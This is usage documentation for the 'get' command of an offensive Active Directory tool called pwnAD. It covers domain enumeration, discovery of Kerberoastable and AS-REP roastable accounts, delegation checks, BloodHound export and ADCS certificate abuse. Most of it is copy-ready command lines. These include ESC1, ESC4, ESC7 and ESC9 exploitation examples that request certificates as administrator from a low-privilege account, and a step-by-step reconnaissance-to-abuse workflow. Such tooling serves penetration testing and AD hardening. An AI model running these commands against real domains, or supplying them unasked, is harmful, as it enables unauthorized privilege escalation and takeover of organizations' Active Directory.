# get Command

Retrieve and enumerate various objects from Active Directory.

## Usage

```bash
pwnAD [auth options] get <subcommand> [arguments]
```

## Subcommands

### User Enumeration

| Subcommand | Description |
|------------|-------------|
| `user` | Get detailed info for a specific user |
| `users` | List all domain users |
| `users_description` | Users with description field set |
| `users_with_admin_count` | Users with adminCount=1 |
| `protected_users` | Members of Protected Users group |

### Group Enumeration

| Subcommand | Description |
|------------|-------------|
| `groups` | List all domain groups |
| `members` | List members of a specific group |
| `membership` | List group memberships for an account |

### Computer Enumeration

| Subcommand | Description |
|------------|-------------|
| `computers` | List all domain computers |
| `DC` | List domain controllers |
| `servers` | List servers |

### Delegation Enumeration

| Subcommand | Description |
|------------|-------------|
| `constrained_delegation` | Accounts with constrained delegation |
| `unconstrained_delegation` | Accounts with unconstrained delegation |
| `RBCD` | Accounts with RBCD configured |
| `not_trusted_for_delegation` | Accounts not trusted for delegation |

### Attack Surface Enumeration

| Subcommand | Description |
|------------|-------------|
| `asreproastables` | Accounts vulnerable to AS-REP roasting |
| `kerberoastables` | Accounts vulnerable to Kerberoasting |
| `password_not_required` | Accounts with PASSWD_NOTREQD flag |
| `passwords_dont_expire` | Accounts with non-expiring passwords |
| `spn` | Accounts with Service Principal Names |

### ADCS

| Subcommand | Description |
|------------|-------------|
| `CA` | Certificate Authorities |
| `adcs` | Full ADCS analysis (templates, CAs, ESC1-ESC15 detection) |
| `adcs_req` | Request a certificate from ADCS (ESC1/ESC6 exploitation via MS-ICPR) |
| `esc4` | ESC4: modify writable template, request cert, restore |
| `esc7` | ESC7: enable SAN via ManageCA, request cert, restore |
| `esc9` | ESC9/ESC10: swap UPN on target, request cert, restore |

### Export

| Subcommand | Description |
|------------|-------------|
| `bloodhound` | Export domain data to BloodHound CE format (zip) |

### Other

| Subcommand | Description |
|------------|-------------|
| `OU` | Organizational Units |
| `containers` | AD containers |
| `accounts_with_sid_histoy` | Accounts with SID history |

## Examples

### User Enumeration

```bash
# Get all users
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get users

# Get specific user details
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get user administrator

# Users with descriptions (might contain passwords)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get users_description
```

### Group Enumeration

```bash
# List all groups
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get groups

# Get Domain Admins members
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get members "Domain Admins"

# Get user's group memberships
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get membership administrator
```

### Attack Surface Discovery

```bash
# Find Kerberoastable accounts
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get kerberoastables

# Find AS-REP roastable accounts
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get asreproastables

# Find accounts with PASSWD_NOTREQD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get password_not_required
```

### Delegation Discovery

```bash
# Unconstrained delegation (potential for credential theft)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get unconstrained_delegation

# Constrained delegation (potential for privilege escalation)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get constrained_delegation

# RBCD targets
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get RBCD
```

### Infrastructure Discovery

```bash
# Domain controllers
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get DC

# Certificate authorities
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get CA

# All computers
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get computers
```

### ADCS Certificate Request

```bash
# Request a certificate using a vulnerable template (ESC1)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
  -ca CORP-CA -template VulnTemplate -upn administrator@domain.local

# With custom subject and output path
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
  -ca CORP-CA -template VulnTemplate -upn admin@domain.local \
  -subject "CN=Administrator" -o admin.pfx

# With DNS SAN
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
  -ca CORP-CA -template VulnTemplate -dns dc01.domain.local
```

### ADCS Exploitation (ESC4, ESC7, ESC9)

```bash
# ESC4: writable template — modify to allow SAN, request cert, restore
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get esc4 \
  -ca CORP-CA -template WritableTemplate -upn administrator@domain.local

# ESC7: ManageCA — enable EDITF_ATTRIBUTESUBJECTALTNAME2, request cert, restore
pwnAD --dc-ip 192.168.1.10 -d domain.local -u caadmin -p 'Pass!' get esc7 \
  -ca CORP-CA -upn administrator@domain.local

# ESC7 with specific template and no restore
pwnAD --dc-ip 192.168.1.10 -d domain.local -u caadmin -p 'Pass!' get esc7 \
  -ca CORP-CA -template User -upn administrator@domain.local --no-restore

# ESC9: GenericWrite on user — swap UPN, request cert (NO_SECURITY_EXTENSION template), restore
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get esc9 \
  -target victim_user -ca CORP-CA -template VulnTemplate -upn administrator@domain.local
```

### BloodHound CE Export

```bash
# Export all collection methods
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound -c all

# DC-only collection (LDAP only, no SMB connections)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound -c dconly

# Specific methods with custom DNS and output directory
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound \
  -c group,acl,trusts -ns 192.168.1.10 -o /tmp/bh-export

# With filename prefix, custom workers, exclude DCs
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' get bloodhound \
  -c all --prefix myexport -w 20 --exclude-dcs
```

## Interactive Mode Usage

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!'

# Quick enumeration workflow
pwnAD [domain.local\lowpriv]> get users
pwnAD [domain.local\lowpriv]> get kerberoastables
pwnAD [domain.local\lowpriv]> get asreproastables
pwnAD [domain.local\lowpriv]> get constrained_delegation
pwnAD [domain.local\lowpriv]> get unconstrained_delegation
```

## Reconnaissance Workflow

A typical reconnaissance workflow:

```bash
# 1. Start with user enumeration
get users
get users_description  # Check for passwords in descriptions

# 2. Check attack surface
get kerberoastables
get asreproastables
get password_not_required

# 3. Identify high-value targets
get members "Domain Admins"
get members "Enterprise Admins"
get users_with_admin_count

# 4. Check delegation
get unconstrained_delegation
get constrained_delegation
get RBCD

# 5. Infrastructure mapping
get DC
get CA
get computers

# 6. ADCS abuse
get adcs_req -ca CORP-CA -template VulnTemplate -upn administrator@domain.local

# 7. BloodHound CE export
get bloodhound -c all
```
